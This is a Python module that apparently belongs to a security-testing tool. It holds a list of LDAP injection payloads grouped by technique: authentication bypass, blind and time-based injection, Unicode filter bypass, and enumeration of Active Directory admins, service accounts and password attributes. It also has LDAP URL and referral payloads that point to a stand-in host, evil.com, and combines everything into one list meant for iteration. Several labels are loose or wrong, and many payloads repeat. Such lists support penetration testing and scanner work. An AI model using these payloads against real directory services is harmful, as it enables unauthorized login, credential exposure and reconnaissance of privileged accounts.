"""
LDAP Injection Payloads

Payloads for LDAP injection attacks including:
- Authentication bypass
- Information disclosure
- Filter bypass
- Blind LDAP injection
"""

# Basic LDAP injection payloads
LDAP_INJECTION_BASIC = [
    {
        "name": "wildcard_admin",
        "payload": "*)(uid=*))%00",
        "description": "Wildcard admin bypass",
    },
    {
        "name": "or_equals_admin",
        "payload": "*)(|(objectClass=*))",
        "description": "OR injection for admin access",
    },
    {
        "name": "or_star",
        "payload": "*)|(objectClass=*))",
        "description": "OR with wildcard injection",
    },
    {
        "name": "and_equals",
        "payload": "*)(|(password=*))",
        "description": "AND injection bypass",
    },
    {
        "name": "and_star",
        "payload": "*)(|(userPassword=*))",
        "description": "AND with wildcard injection",
    },
]

# LDAP authentication bypass
LDAP_AUTH_BYPASS = [
    {
        "name": "null_password",
        "payload": "*)(|(password=*))",
        "description": "Null password bypass",
    },
    {
        "name": "wildcard_password",
        "payload": "*)(|(objectClass=*))",
        "description": "Wildcard authentication bypass",
    },
    {
        "name": "or_equals_true",
        "payload": "*)(|(userPassword=*))",
        "description": "OR equals true bypass",
    },
    {
        "name": "comment_bypass",
        "payload": "*)(%00))",
        "description": "Comment character bypass",
    },
]

# LDAP filter bypass payloads
LDAP_FILTER_BYPASS = [
    {
        "name": "objectclass_or",
        "payload": "*)(|(objectClass=*))",
        "description": "ObjectClass OR bypass",
    },
    {
        "name": "objectclass_and",
        "payload": "*)(objectClass=*))",
        "description": "ObjectClass AND injection",
    },
    {
        "name": "cn_injection",
        "payload": "*)(cn=*))",
        "description": "Common Name injection",
    },
    {
        "name": "uid_injection",
        "payload": "*)(uid=*))",
        "description": "User ID injection",
    },
    {
        "name": "sn_injection",
        "payload": "*)(sn=*))",
        "description": "Surname injection",
    },
    {
        "name": "mail_injection",
        "payload": "*)(mail=*))",
        "description": "Email attribute injection",
    },
]

# LDAP enumeration payloads
LDAP_ENUMERATION = [
    {
        "name": "uid_any",
        "payload": "*)(uid=*))",
        "description": "Enumerate all UIDs",
    },
    {
        "name": "cn_any",
        "payload": "*)(cn=*))",
        "description": "Enumerate all CNs",
    },
    {
        "name": "objectclass_any",
        "payload": "*)(objectClass=*))",
        "description": "Enumerate all objectClasses",
    },
    {
        "name": "mail_any",
        "payload": "*)(mail=*))",
        "description": "Enumerate all emails",
    },
]

# Blind LDAP injection payloads
LDAP_BLIND_INJECTION = [
    {
        "name": "blind_true",
        "payload": "*)(|(objectClass=*))",
        "description": "Blind LDAP with OR true",
    },
    {
        "name": "blind_wildcard",
        "payload": "*)(|(cn=*))",
        "description": "Blind LDAP with wildcard",
    },
    {
        "name": "timing_condition",
        "payload": "*(&(objectClass=*)(|(uid=*)(|(uid=*))))",
        "description": "Complex timing condition",
    },
    {
        "name": "error_based",
        "payload": "*)(uid=*))%00",
        "description": "Error-based LDAP injection",
    },
    {
        "name": "nested_filter",
        "payload": "*(&(objectClass=user)(|(uid=*)(|(uid=*))))",
        "description": "Nested filter injection",
    },
]

# LDAP special character payloads
LDAP_SPECIAL_CHARS = [
    {
        "name": "null_byte",
        "payload": "*)(uid=*))%00",
        "description": "Null byte injection",
    },
    {
        "name": "backslash_escape",
        "payload": "*)(uid=*))\\28*)",
        "description": "Backslash escape bypass",
    },
    {
        "name": "asterisk_injection",
        "payload": "*)(uid=*)(*))",
        "description": "Wildcard injection",
    },
    {
        "name": "parenthesis_bypass",
        "payload": "*)(|(uid=*))",
        "description": "Parenthesis bypass",
    },
    {
        "name": "pipe_injection",
        "payload": "*)(|(objectClass=*))",
        "description": "Pipe operator injection",
    },
]

# LDAP advanced filter payloads
LDAP_ADVANCED_FILTERS = [
    {
        "name": "nested_and",
        "payload": "*(&(uid=*)(objectClass=user))",
        "description": "Nested AND filter",
    },
    {
        "name": "nested_or",
        "payload": "*(|(uid=*)(objectClass=user))",
        "description": "Nested OR filter",
    },
    {
        "name": "not_filter",
        "payload": "(!(uid=*))",
        "description": "NOT filter injection",
    },
    {
        "name": "approx_match",
        "payload": "*)(uid~=admin))",
        "description": "Approximate match filter",
    },
    {
        "name": "substring_match",
        "payload": "*)(uid=*admin*))",
        "description": "Substring match injection",
    },
]

# LDAP attribute injection
LDAP_ATTRIBUTE_INJECTION = [
    {
        "name": "uid_injection",
        "payload": "*)(uid=*))",
        "attribute": "uid",
    },
    {
        "name": "cn_injection",
        "payload": "*)(cn=*))",
        "attribute": "cn",
    },
    {
        "name": "sn_injection",
        "payload": "*)(sn=*))",
        "attribute": "sn",
    },
    {
        "name": "givenname_injection",
        "payload": "*)(givenName=*))",
        "attribute": "givenName",
    },
    {
        "name": "mail_injection",
        "payload": "*)(mail=*))",
        "attribute": "mail",
    },
    {
        "name": "userpassword_injection",
        "payload": "*)(userPassword=*))",
        "attribute": "userPassword",
    },
]

# LDAP search filter syntax
LDAP_FILTER_OPERATORS = [
    "=",
    "=*",
    "~=",
    ">=<",
    "<=",
    ":=",
    "=*",
]

# Common LDAP injection points
LDAP_INJECTION_POINTS = [
    "username",
    "uid",
    "cn",
    "mail",
    "user",
    "dn",
    "filter",
    "search",
    "query",
    "login",
    "email",
    "password",
]

# LDAP success indicators
LDAP_INJECTION_SUCCESS = [
    "root",
    "admin",
    "administrator",
    "uid=",
    "cn=",
    "dn=",
    "objectClass=user",
    "objectClass=person",
    "objectClass=organizationalUnit",
]

# Active Directory specific payloads
ACTIVE_DIRECTORY_INJECTION = [
    {
        "name": "ad_samaccountname",
        "payload": "*)(sAMAccountName=*))",
        "description": "AD sAMAccountName enumeration",
        "attribute": "sAMAccountName",
    },
    {
        "name": "ad_userprincipalname",
        "payload": "*)(userPrincipalName=*))",
        "description": "AD UPN enumeration",
        "attribute": "userPrincipalName",
    },
    {
        "name": "ad_memberof",
        "payload": "*)(memberOf=CN=Domain Admins*))",
        "description": "AD Domain Admins enumeration",
        "attribute": "memberOf",
    },
    {
        "name": "ad_admincount",
        "payload": "*)(adminCount=1))",
        "description": "AD privileged accounts (adminCount)",
        "attribute": "adminCount",
    },
    {
        "name": "ad_serviceprincipalname",
        "payload": "*)(servicePrincipalName=*))",
        "description": "AD SPN enumeration (Kerberoasting)",
        "attribute": "servicePrincipalName",
    },
    {
        "name": "ad_pwdlastset",
        "payload": "*)(pwdLastSet=0))",
        "description": "AD accounts with password never set",
        "attribute": "pwdLastSet",
    },
    {
        "name": "ad_useraccountcontrol",
        "payload": "*)(userAccountControl:1.2.840.113556.1.4.803:=2))",
        "description": "AD disabled accounts",
        "attribute": "userAccountControl",
    },
    {
        "name": "ad_lastlogon",
        "payload": "*)(lastLogon>=0))",
        "description": "AD accounts with logon history",
        "attribute": "lastLogon",
    },
]

# Extensible match filter payloads
EXTENSIBLE_MATCH_INJECTION = [
    {
        "name": "dn_match",
        "payload": "*)(cn:dn:=admin))",
        "description": "DN extensible match",
    },
    {
        "name": "case_exact_match",
        "payload": "*)(cn:caseExactMatch:=Admin))",
        "description": "Case-exact match filter",
    },
    {
        "name": "case_ignore_match",
        "payload": "*)(cn:caseIgnoreMatch:=admin))",
        "description": "Case-ignore match filter",
    },
    {
        "name": "bitwise_and",
        "payload": "*)(userAccountControl:1.2.840.113556.1.4.803:=512))",
        "description": "Bitwise AND (LDAP_MATCHING_RULE_BIT_AND)",
    },
    {
        "name": "bitwise_or",
        "payload": "*)(userAccountControl:1.2.840.113556.1.4.804:=2))",
        "description": "Bitwise OR (LDAP_MATCHING_RULE_BIT_OR)",
    },
    {
        "name": "chain_match",
        "payload": "*)(memberOf:1.2.840.113556.1.4.1941:=CN=Group,DC=domain,DC=com))",
        "description": "Recursive group membership (LDAP_MATCHING_RULE_IN_CHAIN)",
    },
]

# OID-based attribute injection
OID_ATTRIBUTE_INJECTION = [
    {
        "name": "oid_cn",
        "payload": "*)(.2.5.4.3=*))",
        "description": "CN via OID (2.5.4.3)",
        "oid": "2.5.4.3",
    },
    {
        "name": "oid_uid",
        "payload": "*)(0.9.2342.19200300.100.1.1=*))",
        "description": "UID via OID",
        "oid": "0.9.2342.19200300.100.1.1",
    },
    {
        "name": "oid_mail",
        "payload": "*)(0.9.2342.19200300.100.1.3=*))",
        "description": "Mail via OID",
        "oid": "0.9.2342.19200300.100.1.3",
    },
    {
        "name": "oid_userpassword",
        "payload": "*)(2.5.4.35=*))",
        "description": "userPassword via OID",
        "oid": "2.5.4.35",
    },
]

# Unicode normalization bypass
UNICODE_LDAP_BYPASS = [
    {
        "name": "unicode_fullwidth",
        "payload": "*)\uff08\uff5c(objectClass=*)\uff09)",
        "description": "Fullwidth Unicode parentheses bypass",
    },
    {
        "name": "unicode_asterisk",
        "payload": "*)(uid=\u2217))",
        "description": "Unicode asterisk operator",
    },
    {
        "name": "unicode_equals",
        "payload": "*)(uid\uff1dadmin))",
        "description": "Fullwidth equals sign",
    },
    {
        "name": "unicode_pipe",
        "payload": "*)\uff5c(objectClass=*))",
        "description": "Fullwidth pipe character",
    },
]

# LDAP search scope manipulation
LDAP_SCOPE_MANIPULATION = [
    {
        "name": "scope_base",
        "payload": "?base??(objectClass=*)",
        "description": "Base scope injection",
        "scope": "base",
    },
    {
        "name": "scope_one",
        "payload": "?one??(objectClass=*)",
        "description": "One-level scope injection",
        "scope": "one",
    },
    {
        "name": "scope_sub",
        "payload": "?sub??(objectClass=*)",
        "description": "Subtree scope injection",
        "scope": "sub",
    },
]

# LDAP URL injection
LDAP_URL_INJECTION = [
    {
        "name": "ldap_url_basic",
        "payload": "ldap://evil.com/dc=evil,dc=com??sub?(objectClass=*)",
        "description": "LDAP URL injection",
    },
    {
        "name": "ldaps_url",
        "payload": "ldaps://evil.com:636/dc=evil,dc=com",
        "description": "LDAPS URL injection",
    },
    {
        "name": "ldap_referral",
        "payload": "ldap://evil.com/cn=referral,dc=evil",
        "description": "LDAP referral injection",
    },
]

# LDAP time-based blind injection
LDAP_TIME_BASED = [
    {
        "name": "time_delay_complex",
        "payload": "*(&(objectClass=*)(|(uid=*)(|(uid=*)(|(uid=*)(|(uid=*)(|(uid=*))))))))))",
        "description": "Time-based delay via complex filter",
    },
    {
        "name": "time_delay_nested",
        "payload": "*(&(uid=*)(objectClass=*)(&(cn=*)(sn=*)(&(mail=*)(givenName=*))))",
        "description": "Nested filter time delay",
    },
]

# Combined payload list for easy iteration
ALL_LDAP_PAYLOADS = (
    LDAP_INJECTION_BASIC +
    LDAP_AUTH_BYPASS +
    LDAP_FILTER_BYPASS +
    LDAP_ENUMERATION +
    LDAP_BLIND_INJECTION +
    LDAP_SPECIAL_CHARS +
    LDAP_ADVANCED_FILTERS +
    LDAP_ATTRIBUTE_INJECTION +
    ACTIVE_DIRECTORY_INJECTION +
    EXTENSIBLE_MATCH_INJECTION +
    OID_ATTRIBUTE_INJECTION +
    UNICODE_LDAP_BYPASS +
    LDAP_SCOPE_MANIPULATION +
    LDAP_URL_INJECTION +
    LDAP_TIME_BASED
)
